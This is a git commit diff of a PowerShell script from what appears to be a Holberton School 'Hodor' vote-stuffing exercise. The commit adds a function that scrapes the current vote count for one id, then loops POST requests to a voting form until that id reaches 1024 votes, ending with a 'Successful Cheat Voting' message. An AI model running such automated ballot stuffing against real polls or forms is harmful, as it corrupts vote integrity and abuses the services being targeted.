8d6ec9001e339deea315b2e33ce937c888ef79a3
diegojojoayandun <3922@holbertonschool.com>
2022-02-05 06:00:59 -0500

    Add Counting votes function and validation in loop for

--- level0/1024.ps1
+++ level0/1024.ps1
@@ -8,10 +8,28 @@
 # Using WebRequest session (POST)
 #-----------------------------------------
 
+
+function Get-Vote_Count{
+    $progressPreference = 'silentlyContinue'
+    $page = Invoke-WebRequest $url -Method 'Get' -Headers $headers
+    $parse = $page -split 'tr'
+    $match_key = $parse -match '2898'
+    $match_key = $match_key -split '<td>'
+    $match_key = $match_key -replace '\n', ''
+    $match_key = $match_key -replace '</td>', ''
+    $match_key = $match_key -replace '>', ''
+    $match_key = $match_key -replace  '</'
+    $match_key = $match_key -split '\n'
+
+
+    return $match_key[2]
+}
+
+
 $url = "http://158.69.76.135/level0.php";
 
 $sVoteData = @'
-id=3922
+id=2898
 holdthedoor=Submit
 '@
 
@@ -19,16 +37,18 @@ holdthedoor=Submit
 $body = ConvertFrom-StringData -StringData $sVoteData
 $headers = @{'Content-Type'= 'application/x-www-form-urlencoded';'ContentLength' = 64}
 
-for($i=1; $i -le 1024; $i++){
-    $page = Invoke-WebRequest $url -Method 'Post' -Headers $headers -Body $body
-    Write-Host "Sendig vote " -NoNewline
-    Write-Host $i -NoNewline
-    Write-Host ":" -NoNewline
-    write-host $page.StatusDescription -ForegroundColor Red
+$total = Get-Vote_Count
+
+if ($null -eq $total) {
+    $total = 0;
 }
 
-Write-Output "Hodor: Succesful Voting"
+for($i = [int]$total; $i -lt 1024; $i++){
+    $progressPreference = 'silentlyContinue'
+    $page = Invoke-WebRequest $url -Method 'Post' -Headers $headers -Body $body
+    -join("sending vote ", ($i + 1), ": ")|Write-Host -NoNewline
+    write-host $page.StatusDescription -ForegroundColor Green
+}
 
-
-
-
+$total = Get-Vote_Count
+-join("Hodor Successful Cheat Voting, Total ", $total, ": ")|Write-Host
